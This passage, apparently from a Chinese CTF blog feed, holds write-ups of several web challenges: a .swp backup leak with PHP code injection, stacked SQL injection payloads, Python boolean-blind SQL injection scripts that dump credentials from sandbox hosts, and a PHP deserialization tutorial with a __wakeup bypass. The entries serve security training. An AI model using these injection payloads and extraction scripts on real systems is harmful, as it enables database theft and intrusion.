        <content type="html"><![CDATA[<h1 id="2021-第四届红帽杯网络安全大赛-Web-find-it"><a href="#2021-第四届红帽杯网络安全大赛-Web-find-it" class="headerlink" title="2021-第四届红帽杯网络安全大赛-Web-find_it"></a>2021-第四届红帽杯网络安全大赛-Web-find_it</h1><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730102906291-1691288556204-1.png" alt="image-20230730102906291"></p><ol><li>首先进项端口扫描<code>dirsearch</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103550756-1691288556205-2.png" alt="image-20230730103550756"></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103615203-1691288556205-3.png" alt="image-20230730103615203"></p><ol><li>robots.txt 文件内容</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103720699-1691288556205-4.png" alt="image-20230730103720699"></p><ol><li>1ndexx.php 打开404 ，尝试打开备份文件<code>.1ndexx.php.swp</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103951694-1691288556205-5.png" alt="image-20230730103951694"></p><ol><li>查看源代码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105041270-1691288556205-6.png" alt="image-20230730105041270"></p><ol><li>直接访问<a href="https://so.csdn.net/so/search?q=hack&spm=1001.2101.3001.7020">hack</a>.php无法访问 <code>show_source()</code>读取文件：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure><ul><li><code>http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/index.php?code=&lt;?php show_source(__FILE__);?&gt;</code></li><li><code>http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/hack.php</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105401597-1691288556205-7.png" alt="image-20230730105401597"></p><h4 id="关于show-source"><a href="#关于show-source" class="headerlink" title="关于show_source()"></a>关于show_source()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source() 函数对文件进行语法高亮显示。</span><br><span class="line">本函数是 highlight_file() 的别名</span><br><span class="line">12</span><br></pre></td></tr></table></figure><h4 id="关于-swp缓存文件"><a href="#关于-swp缓存文件" class="headerlink" title="关于.swp缓存文件"></a>关于.swp缓存文件</h4><p>文件泄露(.swp备份文件):非正常关闭vi&#x2F;<a href="https://so.csdn.net/so/search?q=vim%E7%BC%96%E8%BE%91%E5%99%A8&spm=1001.2101.3001.7020">vim编辑器</a>时会生成一个.swp文件 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">调用这类的隐藏文件的时候，需要在最前面加.</span><br></pre></td></tr></table></figure><h4 id="官方WriteUp"><a href="#官方WriteUp" class="headerlink" title="官方WriteUp"></a>官方WriteUp</h4><p><a href="https://writeup.ctfhub.com/Challenge/2021/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/Web/oKTHZCKnTRgZzifYg5twqZ.html">find_it | CTFHub</a></p>]]></content>
      
      
      <categories>
          
          <category> -[CTF, ctfhub] </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 备份文件泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随便注 1</title>
      <link href="/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/"/>
      <url>/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</url>
      
        <content type="html"><![CDATA[<h3 id="强网杯2019-随便注"><a href="#强网杯2019-随便注" class="headerlink" title="强网杯2019-随便注"></a>强网杯2019-随便注</h3><p>1，测试<code>1&#39; or 1=1 #</code>,初步判定存在SQL注入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure><p>再测试字段数，到3时报错，说明字段数为2.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure><p>接着尝试union注入,回显了过滤的关键字。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230726152210746.png" alt="image-20230726152210746"></p><p>然后就是今天学会的新姿势“堆叠注入”了。<br>原理很简单，就是通过 ; 号注入多条SQL语句。<br>先通过show databases爆出数据库。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><p>然后用 show tables 尝试爆表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure><p>可以看到这里有两个表，我们先尝试爆words表的内容。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure><p>表名为数字时，要用反引号包起来查询。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure><p>1，通过 rename 先把 words 表改名为其他的表名。</p><p>2，把 1919810931114514 表的名字改为 words 。</p><p>3 ，给新 words 表添加新的列名 id 。</p><p>4，将 flag 改名为 data 。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> BUUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebsiteManger</title>
      <link href="/WebsiteManger/"/>
      <url>/WebsiteManger/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-第四届红帽杯网络安全大赛-Web-WebsiteManger"><a href="#2021-第四届红帽杯网络安全大赛-Web-WebsiteManger" class="headerlink" title="2021-第四届红帽杯网络安全大赛-Web-WebsiteManger"></a>2021-第四届红帽杯网络安全大赛-Web-WebsiteManger</h1><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200208646.png" alt="image-20230729200208646"></p><ol><li>首先f12检查源文件 发现图片可能存在注入点 ：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200355574.png" alt="image-20230729200355574"></p><p><strong>布尔盲注知识点</strong></p><ul><li>&#x2F;image.php?id&#x3D;if(1&#x3D;1,1,5)              True</li><li>&#x2F;image.php?id&#x3D;if(1&#x3D;2,1,5)              False</li></ul><p><code>解释: 条件为真时?id=1，回显第一张图片，条件为假时?id=5，没有id=5的图片，什么都没有。即可作为布尔盲注判断条件</code></p><ol start="2"><li>脚本测试：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">all_str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php&#x27;</span></span><br><span class="line">info = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> all_str:</span><br><span class="line">        payload = <span class="string">&#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(s))</span><br><span class="line">        ans = requests.get(url=url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ans.text) &gt; <span class="number">1000</span>:</span><br><span class="line">            info += s</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="built_in">print</span>(info)</span><br></pre></td></tr></table></figure><p>以上判断出<code>database()=ctf</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200757857.png" alt="image-20230729200757857"></p><ol start="3"><li>根据网上writeup清晰得知：</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆破数据库</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line"><span class="comment">#爆破表名</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\&#x27;ctf\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line"><span class="comment">#爆破列名</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\&#x27;users\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line"><span class="comment">#爆破字段</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line">这里在做题的时候，发现爆破字段得到的结果不是ctf下的users的字段，因为没有加ctf这个限制，应该是爆破到了其他数据库下的users中的字段，需要加上数据库名ctf的限制条件，不过这里题目有对 ‘<span class="keyword">and</span>’关键字过滤，所以需要用‘&amp;&amp;’替换，而且还要编码为ulr格式‘%<span class="number">26</span>%<span class="number">26</span>’，这里也是用brupsuit抓包分析了很久才发现的，不过只要有耐心，最终还是会发现。</span><br><span class="line">修改后的payload</span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\&#x27;users\&#x27;/**/%26%26/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(s))</span><br></pre></td></tr></table></figure><ul><li>关键函数解释<ul><li>mid() 函数：截取字符串一部分，mid(column_name,start[,length])</li><li>ord() 函数：是 chr() 函数（对于8位的ASCII字符串），它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值。返回值是对应的十进制整数。</li><li>group_concat() 函数：连接一个组的所有字符串，并以逗号分隔每一条数据。能一次性查出所有信息。group_concat(str1,str2,…)</li></ul></li></ul><ol start="4"><li>最后得知的信息</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tables_in_ctf: users,images</span><br><span class="line"></span><br><span class="line">Columns_in_users: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,<span class="built_in">id</span>,username,password(此处与writeup有出入)</span><br><span class="line"></span><br><span class="line">values_in_users: adminf5b86501931f812ed3833dee67a43603</span><br><span class="line"> adminc6ef523a171bb9a25f4115044b507d69</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729202534279.png" alt="image-20230729202534279"></p><ol start="5"><li>登录成功后</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204501099.png" alt="image-20230729204501099"></p><p>此处测试发现有ssrf漏洞 <code>输出127.0.0.1后反馈信息出现了(curl)</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204645428.png" alt="image-20230729204645428"></p><p>抓包得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204429740.png" alt="image-20230729204429740"></p><h4 id="官方注入脚本"><a href="#官方注入脚本" class="headerlink" title="官方注入脚本"></a>官方注入脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">charset = <span class="string">&quot;,@&quot;</span>+ string.digits + string.ascii_lowercase + string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">s</span>):</span><br><span class="line">    s = s.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">sql = r(<span class="string">&quot;select concat(id,username,password) from users&quot;</span>)</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> charset:</span><br><span class="line">        cc = <span class="built_in">ord</span>(c)</span><br><span class="line">        url = <span class="string">f&quot;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php?id=-1/**/or/**/(ascii(mid((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;cc&#125;</span>)&quot;</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(r.text) &gt; <span class="number">1024</span>:</span><br><span class="line">            result += c</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204144756.png" alt="image-20230729204144756"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ctfhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h2><h3 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h3><p>serialize() —&gt; 函数用于序列化对象或数组，并返回一个字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class test&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$a</span>= <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$bb</span>= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$ccc</span>= True;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="title function_ invoke__">echoserialize</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$array_t</span>= <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;1&quot;</span>,<span class="string">&quot;bb&quot;</span>=&gt;<span class="string">&quot;2&quot;</span>,<span class="string">&quot;ccc&quot;</span>=&gt;<span class="string">&quot;3&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array_t</span>);</span><br></pre></td></tr></table></figure><blockquote><p>O:4:”test”:3:{s:1:”a”;s:1:”1”;s:2:”bb”;i:2;s:3:”ccc”;b:1;}<br>a:3:</p></blockquote><p>各个字符的意义 —&gt; <code>第一个字母O 代表 Object，a代表 array，s代表 string，,i表示数字</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/640" alt="img"><br><strong>类的属性有三种 private protected 和 public</strong></p><p>PHP 序列化的时候 <strong>private</strong>和 <strong>protected</strong> 变量会引入不可见字符<code>%00</code>，<code>%00类名%00属性名</code> 为private，<code>%00*%00属性名</code> 为protected，注意这两个 <strong>%00</strong>就是 ascii 码为0 的字符。这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class test&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$a</span>= <span class="string">&quot;a&quot;</span>;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$b</span>= <span class="string">&quot;b&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$c</span>= <span class="string">&quot;c&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span>= <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure><blockquote><p>O:4:”test”:3:{s:7:”testa”;s:1:”a”;s:4:”*b”;s:1:”b”;s:1:”c”;s:1:”c”;}</p><p>O%3A4%3A%22test%22%3A3%3A%7Bs%3A7%3A%22%00test%00a%22%3Bs%3A1%3A%22a%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A1%3A%22b%22%3Bs%3A1%3A%22c%22%3Bs%3A1%3A%22c%22%3B%7D</p></blockquote><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h3><p>unserialize() —&gt; 函数用于将通过 serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span>(<span class="string">&#x27;t1&#x27;</span>, <span class="string">&#x27;tt2&#x27;</span>, <span class="string">&#x27;ttt3&#x27;</span>);</span><br><span class="line"><span class="variable">$serialized_data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$sites</span>);</span><br><span class="line"><span class="comment">#echo  $serialized_data;</span></span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialized_data</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>Array<br>(<br>​ [0] &#x3D;&gt; t1<br>​ [1] &#x3D;&gt; tt2<br>​ [2] &#x3D;&gt; ttt3<br>)</p></blockquote><h3 id="常用魔法函数"><a href="#常用魔法函数" class="headerlink" title="常用魔法函数"></a>常用魔法函数</h3><table><thead><tr><th align="left">常用魔法函数</th><th align="center">定义</th></tr></thead><tbody><tr><td align="left">__construct()</td><td align="center">在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法</td></tr><tr><td align="left">__destruct()</td><td align="center">和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法</td></tr><tr><td align="left">__toString()</td><td align="center">当对象被当做一个字符串使用时调用。</td></tr><tr><td align="left">__sleep()</td><td align="center">当调用<code>serialize()</code>函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作</td></tr><tr><td align="left">__wakeup()</td><td align="center">反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</td></tr><tr><td align="left">__invoke()</td><td align="center">把一个实例对象当作函数使用时自动调用</td></tr><tr><td align="left">__call()</td><td align="center">当调用对象中不存在的方法会自动调用该方法。</td></tr><tr><td align="left">__get()</td><td align="center">在调用私有属性的时候会自动执行</td></tr><tr><td align="left">__isset()</td><td align="center">在不可访问的属性上调用isset()或empty()触发</td></tr><tr><td align="left">__unset()</td><td align="center">在不可访问的属性上使用unset()时触发</td></tr></tbody></table><p><strong>__wakeup() bypass</strong></p><p>在需要对__wakeup() 进行绕过的时候，可以让序列化结果中类属性的数值大于其真正的数值进行绕过，这个方式适用于PHP &lt; 5.6.25 和 PHP&lt; 7.0.10</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class User&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;nameis Bob &lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;exit&lt;/br&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;u&quot;</span>]));</span><br></pre></td></tr></table></figure><p>POST 参数O:4:”User”:1:{s:4:”name”;s:3:”Bob”;}可以看到输出是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">object</span>(User)[<span class="number">1</span>]</span><br><span class="line"> <span class="keyword">public</span> <span class="string">&#x27;name&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;Bob&#x27;</span> (length=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">nameis Bob</span><br></pre></td></tr></table></figure><p>如果在某些情况下，不想让__wakeup() 执行，可以将 “User”后的 2 改为一个比2 大的数字</p><p>POST 参数O:4:”User”:2:{s:4:”name”;s:3:”Bob”;}：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nameis <span class="keyword">Bob</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">booleanfalse</span></span><br></pre></td></tr></table></figure><hr><p><strong>[XCTF]Web – Web_php_unserialize</strong></p><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123;   <span class="comment">#构造函数，对类的变量进行初始化</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;  <span class="comment">#魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123;         <span class="comment">#存在$var                   </span></span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);   <span class="comment">#将$var base64解码并赋值$var</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title 